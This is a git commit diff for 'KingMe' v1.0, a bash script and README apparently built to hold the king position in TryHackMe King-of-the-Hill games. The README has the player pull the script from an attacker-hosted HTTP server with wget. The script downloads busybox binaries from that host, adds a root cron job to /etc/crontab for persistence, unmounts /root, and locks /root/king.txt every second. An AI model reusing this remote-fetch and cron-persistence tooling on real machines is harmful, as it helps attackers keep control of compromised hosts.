5ccd5d7ed9f9f93a1707cabbf16da39f4842f126
Squ1rr3l <34318895+redsquirrel7@users.noreply.github.com>
2022-12-28 16:50:07 -0500

    Full Release v1.0
    Uploaded new kingme.sh and README.md

--- README.md
+++ README.md
@@ -8,20 +8,32 @@ However, I am not responsible if you get banned because you used this script.
 Use at your own risk.
 
 ## How to use it
-Firstly, you must be root on the KotH VM in order for this script to work. 
-On your attacker machine in the same directory as KingMe, start an http server to host all the files on port 8080.
+Firstly, you must be root on the KotH VM in order for this script to work.
+
+On your attacker machine in the same directory as KingMe, start an http server to host all the files on port 8080 (Note: The http port used to serve the files must be 8080 as it is hard-coded in this script).
 This python one-liner works pretty well for that:
-`python -m http.server 8080`
-Next, on the KotH VM, use curl to get the kingme.sh script like so:
-`curl -o kingme.sh <attacker IP>:8080/kingme.sh`
+>`python -m http.server 8080`
+
+Next, on the KotH VM, use wget to get the kingme.sh script like so:
+>`wget http://<attacker IP>:8080/kingme.sh`
+
 Then, make kingme.sh executable:
-`chmod u+x kingme.sh`
+>`chmod u+x kingme.sh`
+
 Finally, run kingme.sh and take your rightful place as king!
+>`./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir>`
+Or run as a backgroud process!
+>`./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir> &`
+
+You can also be super 31337 with this one-liner to do everything:
+>`wget http://<attacker IP>:8080/kingme.sh && chmod u+x kingme.sh && ./kingme.sh -u <THM Username> -i <attacker IP> -d <secret working dir> &`
+
+(Note: `-u` and `-i` are required but `-d` is optional. If blank, it will default to `/var/kingme`)
 
 ## How it works
 KingMe sets up a secret working directory, and then downloads several busybox bins to that
 working directory. This will allow the script to run properly even if at some point the bins
-on the KotH VM are moved or messed with. The script then sets up a cron job to restart itself in 
+on the KotH VM are moved or messed with. The script then sets up a cron job to maintain your reign in 
 case the user's shell is terminated or the script stops running for some reason. Finally, 
 the magic happens. Every second KingMe checks /root/king.txt for your username. If it's not 
 there, it puts your username in king.txt. It also locks the file with chattr making it more
@@ -29,18 +41,29 @@ difficult to edit by other players. This should maintain a player as king indefi
 another player figures out what's going on and stops it.
 
 ## How to defeat KingMe
-Remove the cron job that auto starts the script, and delete the working directory that was created.
-You can also just use the mount trick to make king.txt read-only.
+Simply finding and removing the secret working directory will break this script since it relies on 
+bins located in that directory. Also, removing the crontab entry, and killing any running processes 
+should do the trick as well.
 
 ## Future Plans
-- Add counter measures for other king.txt tricks (like the mount trick)
-- The little script the cron job calls is sloppy and will start the whole script over
-even the downloading the bins and such. Gotta clean that up.
-- Auto detect if curl and wget are on the VM and choose which one to use.
-- Parse some args so this thing can be a little more dynamic.
-- Re-write this REAME. It's also sloppy. But hey! It's late! Give me a break! haha
+- Add more protections for king.txt
+- Add more counter-measures for tricks used by other players
+- Create some sort of backup so that the script will continue to run even if our secret working dir and/or processes are found
 
 ## Version Notes
-- v0.1 - Initial release written after some shower thoughts late at night
-- v0.2 - Added steps to rename the busybox bins and make them executable (don't know how I missed this...), added wget commands for the bins (just in case), and added some noclobber stuff. Also, updated "Future Plans" section of README.
-- v0.3 - Fixed the cronjob section since it was not working and creating way too many processes
+- v0.1 
+  - Initial release written after some shower thoughts late at night
+- v0.2 
+  - Added steps to rename the busybox bins and make them executable (don't know how I missed this...)
+  - Added wget commands for the bins (just in case)
+  - Added some noclobber stuff
+  - Updated "Future Plans" section of README.
+- v0.3
+  - Fixed the cronjob section since it was not working and creating way too many processes
+- v1.0 
+  - Full release!
+  - Added arg parsing for easier use
+  - Added counter-measure for mount trick
+  - Made the secret working directory dynamic
+  - Removed curl commands in favor of wget commands
+  - Cleaned up README
--- kingme.sh
+++ kingme.sh
@@ -7,7 +7,7 @@
 #| $$  $$    | $$  | $$  $$$$| $$|_  $$      | $$  $$$| $$| $$__/   
 #| $$\  $$   | $$  | $$\  $$$| $$  \ $$      | $$\  $ | $$| $$      
 #| $$ \  $$ /$$$$$$| $$ \  $$|  $$$$$$/      | $$ \/  | $$| $$$$$$$$
-#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v0.3                         
+#|__/  \__/|______/|__/  \__/ \______/       |__/     |__/|________/ v1.0                         
 #
 # Auto king script for THM KotH
 # Written by Squ1rr3l (aka redsquirrel_7)
@@ -15,67 +15,114 @@
 # DISCLAIMER: I'm pretty sure this isn't against the rules, but
 # I am not responsible if you get banned for using this script!
 
-HACKER_NAME=username	# Put your THM username here
-HACKER_IP=127.0.0.1	# Put the IP of your attacker machine here
+WORKING_DIR=/var/kingme	# Secret working dir
+
+# Parse them args!
+POSITIONAL_ARGS=()
+
+while [[ $# -gt 0 ]]; do
+  case $1 in
+    # Get the THM username to put in king.txt
+    -u|--username)
+      HACKER_NAME="$2"
+      shift
+      shift
+      ;;
+    # Get the IP address of the attacker machine for downloading bins/scripts
+    -i|--ipaddr)
+      HACKER_IP="$2"
+      shift
+      shift
+      ;;
+    # Get the secret working dir
+    -d|--directory)
+      WORKING_DIR="$2"
+      shift
+      shift
+      ;;
+    # Print some helper text
+    -h|--help)
+      echo -e "Usage: ./kingme.sh -u <thm username> -i <your ip> -d <directory>\n\n-u: Your TryHackMe username to put in king.txt\n-i: The IP address of your attacker machine (needed to copy bins)\n-d: Secret working directory for all your bins and the script to work out of. Defaults to /var/kingme."
+      exit 1
+      shift
+      shift
+      ;;
+    # What the balls m8!? That's not an options!
+    -*|--*)
+      echo "Unknown option $1. Use -h for help"
+      exit 1
+      ;;
+    *)
+      POSITIONAL_ARGS+=("$1")
+      shift
+      ;;
+  esac
+done
+
+set -- "${POSITIONAL_ARGS[@]}"
+
+# Error checking (kind of)
+if [ -z $HACKER_NAME ]
+then
+	echo "You need to enter a THM username and an IP address. Use -h for more help."
+	exit 1
+elif [ -z $HACKER_IP ]
+then
+	echo "You need to enter a THM username and an IP address. Use -h for more help."
+	exit 1
+fi
 
 # Set us up a secret working directory
-mkdir /var/kingme
-cd /var/kingme
+mkdir $WORKING_DIR
+cd $WORKING_DIR
 
 # Copy all the bins here and the kingme script as a backup
-#
-# Gotta figure out how to check for curl and wget
-# and automatically decide which commands to use.
-#curl -o "kingme.sh" $HACKER_IP:8080/kingme.sh
-#curl -o "grep" $HACKER_IP:8080/busybox_GREP
-#curl -o "echo" $HACKER_IP:8080/busybox_ECHO
-#curl -o "chattr" $HACKER_IP:8080/busybox_CHATTR
-#curl -o "chmod" $HACKER_IP:8080/busybox_CHMOD
-#curl -o "cat" $HACKER_IP:8080/busybox_CAT
-
-# Uncomment these wget commands if curl is not the VM
+# Removed all the curl commands since it seems most boxes have wget and not curl
+# I'll add them back if I'm proven wrong
 wget http://$HACKER_IP:8080/kingme.sh
 wget http://$HACKER_IP:8080/busybox_GREP
 wget http://$HACKER_IP:8080/busybox_ECHO
 wget http://$HACKER_IP:8080/busybox_CHATTR
 wget http://$HACKER_IP:8080/busybox_CHMOD
 wget http://$HACKER_IP:8080/busybox_CAT
-#wget http://$HACKER_IP:8080/kingcron.sh
 
+# Rename them bins!
 mv -v busybox_GREP grep
 mv -v busybox_ECHO echo
 mv -v busybox_CHATTR chattr
 mv -v busybox_CHMOD chmod
 mv -v busybox_CAT cat
 
+# All this stuff needs to be executable
 chmod u+x kingme.sh
 chmod u+x grep
 chmod u+x echo
 chmod u+x chattr
 chmod u+x chmod
 chmod u+x cat
-#chmod u+x kingcron.sh
+
 
 # Make sure our script runs again even if our shell gets borked
-/var/kingme/echo -e "#!/bin/bash\n# Just in case our shell gets borked\n# to be run as a cron job\n#\nHACKER_NAME=$HACKER_NAME\n\nif /var/kingme/grep -q $HACKER_NAME /root/king.txt; then\n	echo "you are king"\n	exit\nelse\n	while true\n	do\n		if /var/kingme/grep -q $HACKER_NAME /root/king.txt; then\n			/var/kingme/echo $HACKER_NAME "is king! Nothing to do!"\n		else\n			/var/kingme/chattr -ai /root/king.txt\n			/var/kingme/chmod u+w /root/king.txt\n			set +o noclobber /root/king.txt\n			/var/kingme/echo $HACKER_NAME > /root/king.txt\n			/var/kingme/chattr +ai /root/king.txt\n			set -o noclobber /root/king.txt\n		fi\n		sleep 1\n	done\nfi\n" > /var/kingme/kingcron.sh
+$WORKING_DIR/echo -e "#!/bin/bash\n# Just in case our shell gets borked\n# to be run as a cron job\n#\nHACKER_NAME=$HACKER_NAME\n\nif $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n	echo "you are king"\n	exit\nelse\n	while true\n	do\n		if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then\n			$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"\n		else\n			$WORKING_DIR/chattr -ai /root/king.txt\n			$WORKING_DIR/chmod u+w /root/king.txt\n			set +o noclobber /root/king.txt\n			$WORKING_DIR/echo $HACKER_NAME > /root/king.txt\n			$WORKING_DIR/chattr +ai /root/king.txt\n			set -o noclobber /root/king.txt\n		fi\n		sleep 1\n	done\nfi\n" > $WORKING_DIR/kingcron.sh
 
-/var/kingme/chmod u+x /var/kingme/kingcron.sh
-/var/kingme/echo "* * * * *  root  /var/kingme/kingcron.sh" >> /etc/crontab
+$WORKING_DIR/chmod u+x $WORKING_DIR/kingcron.sh
+$WORKING_DIR/echo "* * * * *  root  $WORKING_DIR/kingcron.sh" >> /etc/crontab
 
 
 # Forever take your rightful throne as king!!!
 while true
 do
-	if /var/kingme/grep -q $HACKER_NAME /root/king.txt; then
-		/var/kingme/echo $HACKER_NAME "is king! Nothing to do!"
+	if $WORKING_DIR/grep -q $HACKER_NAME /root/king.txt; then
+		$WORKING_DIR/echo $HACKER_NAME "is king! Nothing to do!"
 	else
-		LOSER=$(/var/kingme/cat /root/king.txt)
-		/var/kingme/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
-		/var/kingme/chattr -ai /root/king.txt
-		/var/kingme/chmod u+w /root/king.txt
+		LOSER=$($WORKING_DIR/cat /root/king.txt)
+		$WORKING_DIR/echo $LOSER "dethroned you! Making" $HACKER_NAME "king once again!"
+		umount /root
+		$WORKING_DIR/chattr -ai /root/king.txt
+		$WORKING_DIR/chmod u+w /root/king.txt
 		set +o noclobber /root/king.txt
-		/var/kingme/echo $HACKER_NAME > /root/king.txt
-		/var/kingme/chattr +ai /root/king.txt
+		$WORKING_DIR/echo $HACKER_NAME > /root/king.txt
+		$WORKING_DIR/chattr +ai /root/king.txt
 		set -o noclobber /root/king.txt
 	fi
 	sleep 1
